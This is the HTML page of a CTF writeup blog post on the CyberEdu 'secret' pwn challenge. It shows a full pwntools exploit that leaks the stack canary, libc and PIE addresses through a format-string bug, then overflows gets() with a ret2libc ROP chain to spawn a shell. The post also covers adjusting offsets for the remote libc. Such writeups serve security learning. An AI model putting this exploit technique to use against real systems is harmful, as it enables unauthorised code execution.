@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu secret Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Format-String">
+<meta name="description" content="Challenge overview
+Just another pwn challenge.
+
+Straight away, we&rsquo;re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a gets(v1).
+The format string vulnerability is in main:
+
+And here is the gets(v1) that allows us to buffer overflow:
+
+So, ret2libc with a canary.
+
+The exploit
+We quickly gain shell locally using this script (first try!):
+# %15$p is the canary
+# %17$p  is libc &#43; 0x1f68
+# %19$p is PIE &#43; 0xb6d
+
+#to use gadgets we need to leak PIE base too
+
+name_payload = b&#34;%15$p.%17$p.%19$p&#34;
+p.recvuntil(b&#34;Name: &#34;)
+p.sendline(name_payload)
+p.recvuntil(b&#34;Hillo &#34;)
+leaks = p.recvline().strip()
+canary, libc_leak, pie_leak = leaks.split(b&#34;.&#34;)
+
+canary = int(canary, 16)
+libc_leak = int(libc_leak, 16)
+pie_leak = int(pie_leak, 16)
+
+print(f&#34;canary: {hex(canary)}&#34;)
+print(f&#34;libc leak: {hex(libc_leak)}&#34;)
+print(f&#34;pie leak: {hex(libc_leak)}&#34;)
+
+libc = libc_leak - 0x1f68
+pie = pie_leak - 0xb6d
+
+#local
+binsh_offset = 0x17fe3c
+system_offset = 0x2b910
+
+pop_rdi_ret = 0xca3 &#43; pie
+ret = 0x889 &#43; pie
+
+system = libc &#43; system_offset
+binsh = libc &#43; binsh_offset
+
+p.recvuntil(b&#34;Phrase: &#34;)
+
+payload = ( b&#34;a&#34;*136 &#43;  #s1
+	    p64(canary) &#43; 
+	    b&#34;b&#34; * 8 &#43;  #rbp
+	    p64(pop_rdi_ret) &#43;
+	    p64(binsh) &#43;
+	    p64(ret) &#43;
+	    p64(system)
+          )
+
+p.sendline(payload)
+
+p.interactive()
+For the remote instance, we most probably need to recalculate the offsets, for both the different glibc version and the format strings. I found the format string differences easily:">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/secret-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/secret-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/secret-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu secret Writeup">
+  <meta property="og:description" content="Challenge overview Just another pwn challenge.
+Straight away, we’re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a gets(v1).
+The format string vulnerability is in main:
+And here is the gets(v1) that allows us to buffer overflow:
+So, ret2libc with a canary.
+The exploit We quickly gain shell locally using this script (first try!):
+# %15$p is the canary # %17$p is libc &#43; 0x1f68 # %19$p is PIE &#43; 0xb6d #to use gadgets we need to leak PIE base too name_payload = b&#34;%15$p.%17$p.%19$p&#34; p.recvuntil(b&#34;Name: &#34;) p.sendline(name_payload) p.recvuntil(b&#34;Hillo &#34;) leaks = p.recvline().strip() canary, libc_leak, pie_leak = leaks.split(b&#34;.&#34;) canary = int(canary, 16) libc_leak = int(libc_leak, 16) pie_leak = int(pie_leak, 16) print(f&#34;canary: {hex(canary)}&#34;) print(f&#34;libc leak: {hex(libc_leak)}&#34;) print(f&#34;pie leak: {hex(libc_leak)}&#34;) libc = libc_leak - 0x1f68 pie = pie_leak - 0xb6d #local binsh_offset = 0x17fe3c system_offset = 0x2b910 pop_rdi_ret = 0xca3 &#43; pie ret = 0x889 &#43; pie system = libc &#43; system_offset binsh = libc &#43; binsh_offset p.recvuntil(b&#34;Phrase: &#34;) payload = ( b&#34;a&#34;*136 &#43; #s1 p64(canary) &#43; b&#34;b&#34; * 8 &#43; #rbp p64(pop_rdi_ret) &#43; p64(binsh) &#43; p64(ret) &#43; p64(system) ) p.sendline(payload) p.interactive() For the remote instance, we most probably need to recalculate the offsets, for both the different glibc version and the format strings. I found the format string differences easily:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-30T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-12-30T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Buffer-Overflow">
+    <meta property="article:tag" content="Format-String">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu secret Writeup">
+<meta name="twitter:description" content="Challenge overview
+Just another pwn challenge.
+
+Straight away, we&rsquo;re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a gets(v1).
+The format string vulnerability is in main:
+
+And here is the gets(v1) that allows us to buffer overflow:
+
+So, ret2libc with a canary.
+
+The exploit
+We quickly gain shell locally using this script (first try!):
+# %15$p is the canary
+# %17$p  is libc &#43; 0x1f68
+# %19$p is PIE &#43; 0xb6d
+
+#to use gadgets we need to leak PIE base too
+
+name_payload = b&#34;%15$p.%17$p.%19$p&#34;
+p.recvuntil(b&#34;Name: &#34;)
+p.sendline(name_payload)
+p.recvuntil(b&#34;Hillo &#34;)
+leaks = p.recvline().strip()
+canary, libc_leak, pie_leak = leaks.split(b&#34;.&#34;)
+
+canary = int(canary, 16)
+libc_leak = int(libc_leak, 16)
+pie_leak = int(pie_leak, 16)
+
+print(f&#34;canary: {hex(canary)}&#34;)
+print(f&#34;libc leak: {hex(libc_leak)}&#34;)
+print(f&#34;pie leak: {hex(libc_leak)}&#34;)
+
+libc = libc_leak - 0x1f68
+pie = pie_leak - 0xb6d
+
+#local
+binsh_offset = 0x17fe3c
+system_offset = 0x2b910
+
+pop_rdi_ret = 0xca3 &#43; pie
+ret = 0x889 &#43; pie
+
+system = libc &#43; system_offset
+binsh = libc &#43; binsh_offset
+
+p.recvuntil(b&#34;Phrase: &#34;)
+
+payload = ( b&#34;a&#34;*136 &#43;  #s1
+	    p64(canary) &#43; 
+	    b&#34;b&#34; * 8 &#43;  #rbp
+	    p64(pop_rdi_ret) &#43;
+	    p64(binsh) &#43;
+	    p64(ret) &#43;
+	    p64(system)
+          )
+
+p.sendline(payload)
+
+p.interactive()
+For the remote instance, we most probably need to recalculate the offsets, for both the different glibc version and the format strings. I found the format string differences easily:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu secret Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/secret-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu secret Writeup",
+  "name": "CyberEdu secret Writeup",
+  "description": "Challenge overview Just another pwn challenge.\nStraight away, we\u0026rsquo;re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a gets(v1).\nThe format string vulnerability is in main:\nAnd here is the gets(v1) that allows us to buffer overflow:\nSo, ret2libc with a canary.\nThe exploit We quickly gain shell locally using this script (first try!):\n# %15$p is the canary # %17$p is libc + 0x1f68 # %19$p is PIE + 0xb6d #to use gadgets we need to leak PIE base too name_payload = b\u0026#34;%15$p.%17$p.%19$p\u0026#34; p.recvuntil(b\u0026#34;Name: \u0026#34;) p.sendline(name_payload) p.recvuntil(b\u0026#34;Hillo \u0026#34;) leaks = p.recvline().strip() canary, libc_leak, pie_leak = leaks.split(b\u0026#34;.\u0026#34;) canary = int(canary, 16) libc_leak = int(libc_leak, 16) pie_leak = int(pie_leak, 16) print(f\u0026#34;canary: {hex(canary)}\u0026#34;) print(f\u0026#34;libc leak: {hex(libc_leak)}\u0026#34;) print(f\u0026#34;pie leak: {hex(libc_leak)}\u0026#34;) libc = libc_leak - 0x1f68 pie = pie_leak - 0xb6d #local binsh_offset = 0x17fe3c system_offset = 0x2b910 pop_rdi_ret = 0xca3 + pie ret = 0x889 + pie system = libc + system_offset binsh = libc + binsh_offset p.recvuntil(b\u0026#34;Phrase: \u0026#34;) payload = ( b\u0026#34;a\u0026#34;*136 + #s1 p64(canary) + b\u0026#34;b\u0026#34; * 8 + #rbp p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system) ) p.sendline(payload) p.interactive() For the remote instance, we most probably need to recalculate the offsets, for both the different glibc version and the format strings. I found the format string differences easily:\n",
+  "keywords": [
+    "CyberEdu", "pwn", "buffer-overflow", "Format-String"
+  ],
+  "articleBody": "Challenge overview Just another pwn challenge.\nStraight away, we’re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a gets(v1).\nThe format string vulnerability is in main:\nAnd here is the gets(v1) that allows us to buffer overflow:\nSo, ret2libc with a canary.\nThe exploit We quickly gain shell locally using this script (first try!):\n# %15$p is the canary # %17$p is libc + 0x1f68 # %19$p is PIE + 0xb6d #to use gadgets we need to leak PIE base too name_payload = b\"%15$p.%17$p.%19$p\" p.recvuntil(b\"Name: \") p.sendline(name_payload) p.recvuntil(b\"Hillo \") leaks = p.recvline().strip() canary, libc_leak, pie_leak = leaks.split(b\".\") canary = int(canary, 16) libc_leak = int(libc_leak, 16) pie_leak = int(pie_leak, 16) print(f\"canary: {hex(canary)}\") print(f\"libc leak: {hex(libc_leak)}\") print(f\"pie leak: {hex(libc_leak)}\") libc = libc_leak - 0x1f68 pie = pie_leak - 0xb6d #local binsh_offset = 0x17fe3c system_offset = 0x2b910 pop_rdi_ret = 0xca3 + pie ret = 0x889 + pie system = libc + system_offset binsh = libc + binsh_offset p.recvuntil(b\"Phrase: \") payload = ( b\"a\"*136 + #s1 p64(canary) + b\"b\" * 8 + #rbp p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system) ) p.sendline(payload) p.interactive() For the remote instance, we most probably need to recalculate the offsets, for both the different glibc version and the format strings. I found the format string differences easily:\n#for the remote version, canary at 15, pie+0xc40 at 16, libc+? at %2$p, %3$p, %4$p name_payload = b\"%15$p.%3$p.%16$p\" #libc = libc_leak - 0x1f68 local libc = libc_leak - 0x? #pie = pie_leak - 0xb6d local pie = pie_leak - 0xc40 Because I thought I was too smart to just leak puts, I thought I could figure out the libc version myself.\nThe challenge came out 5 years ago, so 2020, with the latest version being 2.31. Most of the DCTF2019 challenges use the libc6_2.23-0ubuntu10_amd64 libc version, especially those with binary names that start with pwn_.\nI printed out the elf.got:\n{'frame_dummy': 2104792, 'enable_timeout_cons': 2104800, '__do_global_dtors_aux': 2104808, '__dso_handle': 2105464, '_ITM_deregisterTMCloneTable': 2105304, '__gmon_start__': 2105312, '_Jv_RegisterClasses': 2105320, '_ITM_registerTMCloneTable': 2105328, '__cxa_finalize': 2105336, 'stdout': 2105472, 'stdin': 2105488, 'puts': 2105368, '__stack_chk_fail': 2105376, 'printf': 2105384, 'memset': 2105392, 'alarm': 2105400, 'read': 2105408, '__libc_start_main': 2105416, 'strcmp': 2105424, 'signal': 2105432, 'gets': 2105440, 'setvbuf': 2105448}\nFor a while, I found an offset like %4$p and with libc.blukat I just tried every possible GOT function, but literally nothing worked and it took a considerable amount of time. Then I searched for the suffixes of the leaks in the blukat library for libc6_2.23-0ubuntu10_amd64.\nObviously I didn’t find anything that worked, so I just ended up leaking puts like a normal person.\nExtremely unsurprisingly, our version of libc: libc6_2.23-0ubuntu10_amd64.\nI subtracted puts’ offset from it to get libc, and then I could calculate the offset from out leak, %3$p, to libc, which ended up being 0xF72C0. Now, with all the proper changes, we get the flag:\nAs always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "478",
+  "inLanguage": "en",
+  "datePublished": "2025-12-30T00:00:00Z",
+  "dateModified": "2025-12-30T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/secret-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu secret Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-12-30 00:00:00 +0000 UTC'>December 30, 2025</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>Just another pwn <strong><a href="https://app.cyber-edu.co/challenges/559e4ec0-7f21-11ea-b4cb-3db05c1cfb77?tenant=cyberedu">challenge</a></strong>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/secret-writeup/pic1.png#center"></p>
+<p>Straight away, we&rsquo;re dealing with a 64-bit PIE with canary enabled, and a format string vulnerability, and a <code>gets(v1)</code>.</p>
+<p>The format string vulnerability is in <code>main</code>:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/secret-writeup/pic2.png#center"></p>
+<p>And here is the <code>gets(v1)</code> that allows us to buffer overflow:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/secret-writeup/pic3.png#center"></p>
+<p>So, ret2libc with a canary.</p>
+<hr>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<p>We quickly gain shell locally using this script (first try!):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># %15$p is the canary</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># %17$p  is libc + 0x1f68</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># %19$p is PIE + 0xb6d</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#to use gadgets we need to leak PIE base too</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%15$p.%17$p.%19$p&#34;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Name: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(name_payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hillo &#34;</span>)
+</span></span><span style="display:flex;"><span>leaks <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>canary, libc_leak, pie_leak <span style="color:#f92672">=</span> leaks<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> int(canary, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> int(libc_leak, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>pie_leak <span style="color:#f92672">=</span> int(pie_leak, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;canary: </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc leak: </span><span style="color:#e6db74">{</span>hex(libc_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;pie leak: </span><span style="color:#e6db74">{</span>hex(libc_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1f68</span>
+</span></span><span style="display:flex;"><span>pie <span style="color:#f92672">=</span> pie_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xb6d</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#local</span>
+</span></span><span style="display:flex;"><span>binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x17fe3c</span>
+</span></span><span style="display:flex;"><span>system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2b910</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xca3</span> <span style="color:#f92672">+</span> pie
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x889</span> <span style="color:#f92672">+</span> pie
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> system_offset
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> binsh_offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Phrase: &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> ( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">136</span> <span style="color:#f92672">+</span>  <span style="color:#75715e">#s1</span>
+</span></span><span style="display:flex;"><span>	    p64(canary) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>	    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>  <span style="color:#75715e">#rbp</span>
+</span></span><span style="display:flex;"><span>	    p64(pop_rdi_ret) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>	    p64(binsh) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>	    p64(ret) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>	    p64(system)
+</span></span><span style="display:flex;"><span>          )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>For the remote instance, we most probably need to recalculate the offsets, for both the different <code>glibc</code> version and the format strings. I found the format string differences easily:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#for the remote version, canary at 15, pie+0xc40 at 16, libc+? at %2$p, %3$p, %4$p</span>
+</span></span><span style="display:flex;"><span>name_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%15$p.%3$p.%16$p&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#libc = libc_leak - 0x1f68 local</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0</span>x<span style="color:#960050;background-color:#1e0010">?</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pie = pie_leak - 0xb6d local</span>
+</span></span><span style="display:flex;"><span>pie <span style="color:#f92672">=</span> pie_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xc40</span>
+</span></span></code></pre></div><p>Because I thought I was too smart to just leak puts, I thought I could figure out the libc version myself.</p>
+<p>The challenge came out 5 years ago, so 2020, with the latest version being <code>2.31</code>. Most of the <code>DCTF2019</code> challenges use the <code>libc6_2.23-0ubuntu10_amd64</code> libc version, especially those with binary names that start with <code>pwn_</code>.</p>
+<p>I printed out the <code>elf.got</code>:</p>
+<p><code>{'frame_dummy': 2104792, 'enable_timeout_cons': 2104800, '__do_global_dtors_aux': 2104808, '__dso_handle': 2105464, '_ITM_deregisterTMCloneTable': 2105304, '__gmon_start__': 2105312, '_Jv_RegisterClasses': 2105320, '_ITM_registerTMCloneTable': 2105328, '__cxa_finalize': 2105336, 'stdout': 2105472, 'stdin': 2105488, 'puts': 2105368, '__stack_chk_fail': 2105376, 'printf': 2105384, 'memset': 2105392, 'alarm': 2105400, 'read': 2105408, '__libc_start_main': 2105416, 'strcmp': 2105424, 'signal': 2105432, 'gets': 2105440, 'setvbuf': 2105448}</code></p>
+<p>For a while, I found an offset like <code>%4$p</code> and with <code>libc.blukat</code> I just tried every possible GOT function, but literally nothing worked and it took a <em>considerable</em> amount of time. Then I searched for the suffixes of the leaks in the blukat library for <code>libc6_2.23-0ubuntu10_amd64</code>.</p>
+<p>Obviously I didn&rsquo;t find anything that worked, so I just ended up leaking <code>puts</code> like a normal person.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/secret-writeup/pic4.png#center"></p>
+<p>Extremely unsurprisingly, our version of <code>libc</code>: <code>libc6_2.23-0ubuntu10_amd64</code>.</p>
+<p>I subtracted <code>puts</code>&rsquo; offset from it to get <code>libc</code>, and then I could calculate the offset from out leak, <code>%3$p</code>, to <code>libc</code>, which ended up being <code>0xF72C0</code>. Now, with all the proper changes, we get the flag:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/secret-writeup/pic5.png#center"></p>
+<hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/secret.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/format-string/">Format-String</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
